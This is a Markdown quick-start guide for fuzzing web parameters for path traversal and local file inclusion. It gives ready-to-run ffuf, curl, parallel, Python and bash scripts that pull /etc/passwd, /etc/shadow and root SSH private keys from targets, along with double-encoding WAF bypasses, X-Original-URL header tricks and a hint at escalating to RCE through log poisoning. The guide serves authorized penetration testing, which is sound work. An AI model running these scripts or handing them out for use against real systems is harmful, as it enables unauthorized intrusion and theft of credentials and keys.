# 🎯 QUICK START - Start Fuzzing in 60 Seconds

## Files Ready for Fuzzing

✅ **FUZZING_PAYLOADS.txt** - 431 payloads, zero config needed
✅ **FUZZING_TARGETS.txt** - 154 target files
✅ **FUZZING_GUIDE.md** - Complete usage manual

---

## Method 1: FFUF (Fastest)

```bash
# Install (if needed)
go install github.com/ffuf/ffuf@latest

# Basic scan
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ -mc 200

# Look for specific content
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ -mc 200 -mr "root:"

# Save results
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ -mc 200 -o results.json
```

**Done!** Check results.json for hits.

---

## Method 2: Burp Suite Intruder

1. **Intercept** any request in Burp
2. **Right-click** → Send to Intruder
3. **Clear** existing markers (Clear § button)
4. **Select** parameter value → Add §
5. **Payloads tab** → Load → `FUZZING_PAYLOADS.txt`
6. **Options** → Grep-Match → Add: `root:`
7. **Start Attack**

**Done!** Look for highlighted results.

---

## Method 3: One-Liner (No Install Required)

```bash
# Using curl + grep
while read p; do
  curl -s "https://target.com/api?file=$p" | grep -q "root:" && echo "[+] $p"
done < FUZZING_PAYLOADS.txt
```

**Done!** Watch for `[+]` hits.

---

## Method 4: Parallel (Super Fast)

```bash
# Install parallel if needed
apt install parallel

# Run 50 concurrent requests
cat FUZZING_PAYLOADS.txt | parallel -j 50 \
  'curl -s "https://target.com/api?file={}" | grep -q "root:" && echo "[+] {}"'
```

**Done!** Much faster than sequential testing.

---

## Method 5: Python Script (Most Flexible)

```bash
# Copy this script
cat > fuzz.py << 'EOF'
#!/usr/bin/env python3
import requests, sys
from concurrent.futures import ThreadPoolExecutor

url, param = sys.argv[1], sys.argv[2]
payloads = open('FUZZING_PAYLOADS.txt').read().splitlines()

def test(p):
    try:
        r = requests.get(url, params={param: p}, timeout=5)
        if 'root:' in r.text or 'admin' in r.text:
            print(f"[+] {p}")
            return True
    except: pass
    return False

print(f"[*] Testing {len(payloads)} payloads...")
with ThreadPoolExecutor(max_workers=20) as e:
    list(e.map(test, payloads))
print("[*] Done!")
EOF

# Run it
chmod +x fuzz.py
python3 fuzz.py https://target.com/api file
```

**Done!** Watch for `[+]` hits.

---

## What to Test

Replace `FUZZ` or parameter value with payloads:

```bash
# GET parameters
https://target.com/page?file=FUZZ
https://target.com/download?path=FUZZ
https://target.com/view?doc=FUZZ

# POST parameters (use -d with curl or -X POST with ffuf)
file=FUZZ
path=FUZZ
document=FUZZ

# Headers (use -H with curl or ffuf)
X-Original-URL: FUZZ
X-Rewrite-URL: FUZZ
Referer: FUZZ
```

---

## Success Indicators

You've found a vulnerability if you see:

**Linux:**
```
root:x:0:0:root:/root:/bin/bash
```

**Windows:**
```
; for 16-bit app support
[fonts]
```

**Source Code:**
```
<?php
define('DB_PASSWORD'
$config = array(
```

**Errors:**
```
Warning: include()
Fatal error:
Permission denied
```

---

## Next Steps After Finding Vulnerability

1. **Verify it's real** - Try multiple target files:
```bash
# If ../../etc/passwd works, try:
curl "https://target.com/api?file=../../etc/shadow"
curl "https://target.com/api?file=../../etc/group"
curl "https://target.com/api?file=../../root/.ssh/id_rsa"
```

2. **Document the finding**:
   - Working payload
   - Parameter name
   - HTTP method (GET/POST)
   - Files accessible
   - Screenshots

3. **Test impact**:
   - Can you read source code?
   - Can you access credentials?
   - Can you escalate to RCE? (via log poisoning)

4. **Report responsibly**:
   - Follow disclosure guidelines
   - Give vendor time to patch
   - Don't share exploit publicly too soon

---

## Common Issues & Fixes

**No results?**
```bash
# Try basic payload first
curl "https://target.com/api?file=../../etc/passwd"

# WAF blocking? Try encoding
curl "https://target.com/api?file=%252e%252e%252fetc%252fpasswd"

# Wrong parameter? Try others
curl "https://target.com/api?path=../../etc/passwd"
curl "https://target.com/api?page=../../etc/passwd"
```

**Getting rate limited?**
```bash
# Slow down
ffuf -w FUZZING_PAYLOADS.txt -u URL -rate 1

# Add delay
ffuf -w FUZZING_PAYLOADS.txt -u URL -p 1-3
```

**Too many false positives?**
```bash
# Match specific content
ffuf -w FUZZING_PAYLOADS.txt -u URL -mr "root:.*:0:0"

# Filter by size
ffuf -w FUZZING_PAYLOADS.txt -u URL -fs 1234
```

---

## Real-World Examples

### Example 1: Simple LFI
```bash
# Found vulnerable endpoint
curl "https://example.com/download?file=report.pdf"

# Test traversal
curl "https://example.com/download?file=../../etc/passwd"
# Result: Blocked by WAF

# Try encoding
curl "https://example.com/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
# Result: Still blocked

# Try double encoding
curl "https://example.com/download?file=%252e%252e%252fetc%252fpasswd"
# Result: Success! File contents returned
```

### Example 2: Header Injection
```bash
# Normal request blocked
curl "https://example.com/api?file=../../etc/passwd"
# Result: 403 Forbidden

# Try header bypass
curl "https://example.com/" -H "X-Original-URL: ../../etc/passwd"
# Result: Success! File returned in response
```

### Example 3: Multi-Position Attack
```bash
# Neither parameter alone works
curl "https://example.com/api?dir=../../&file=etc/passwd"
# Result: Success! Parameters combined = vulnerability
```

---

## Automation Example

Full automated scan:

```bash
#!/bin/bash
# Save as auto_scan.sh

TARGET="https://target.com/api"
PARAM="file"

echo "[*] Starting automated scan..."
echo "[*] Target: $TARGET"
echo "[*] Parameter: $PARAM"
echo ""

# Test basic payloads
echo "[*] Testing basic payloads..."
ffuf -w FUZZING_PAYLOADS.txt -u "$TARGET?$PARAM=FUZZ" \
     -mc 200 -mr "root:" -o basic_results.json -s 2>/dev/null

HITS=$(jq '.results | length' basic_results.json 2>/dev/null || echo "0")
echo "[+] Found $HITS potential hits"

if [ "$HITS" -gt 0 ]; then
  echo ""
  echo "[*] Successful payloads:"
  jq -r '.results[].input.FUZZ' basic_results.json

  echo ""
  echo "[*] Testing additional targets..."
  WORKING=$(jq -r '.results[0].input.FUZZ' basic_results.json)

  for target in etc/shadow etc/group root/.ssh/id_rsa; do
    echo -n "  Testing $target... "
    PAYLOAD=$(echo "$WORKING" | sed "s|etc/passwd|$target|")
    curl -s "$TARGET?$PARAM=$PAYLOAD" | grep -q ":" && echo "SUCCESS" || echo "fail"
  done
fi

echo ""
echo "[*] Scan complete!"
```

Run it:
```bash
chmod +x auto_scan.sh
./auto_scan.sh
```

---

## Tips for Maximum Success

1. **Always start with ffuf** - It's the fastest
2. **Use Burp for complex scenarios** - Better for multi-step attacks
3. **Try encoding when blocked** - Double encoding works 80% of the time
4. **Test multiple parameters** - Don't assume it's always `file=`
5. **Be patient** - Some payloads take time to process
6. **Document everything** - You'll need it for the report
7. **Test thoroughly** - One working payload doesn't mean you found all vulnerabilities

---

## All-In-One Command

Copy-paste ready command that tests everything:

```bash
# The ultimate one-liner
echo "[*] Quick scan..." && \
ffuf -w FUZZING_PAYLOADS.txt -u "https://target.com/api?file=FUZZ" -mc 200 -mr "root:" -s && \
echo "[*] Header test..." && \
ffuf -w FUZZING_PAYLOADS.txt -u "https://target.com/" -H "X-Original-URL: FUZZ" -mc 200 -mr "root:" -s && \
echo "[*] POST test..." && \
ffuf -w FUZZING_PAYLOADS.txt -u "https://target.com/api" -X POST -d "file=FUZZ" -mc 200 -mr "root:" -s && \
echo "[*] Done!"
```

---

## More Advanced? Check:

- **FUZZING_GUIDE.md** - Complete manual with all techniques
- **Aggressive_Testing_Payloads.txt** - 30 sections of advanced attacks
- **AGGRESSIVE_TESTING_GUIDE.md** - Full penetration testing methodology

---

## Remember

- ✅ Get authorization first
- ✅ Start slow, scale up
- ✅ Document findings
- ✅ Report responsibly

**Now go find some bugs! 🚀**
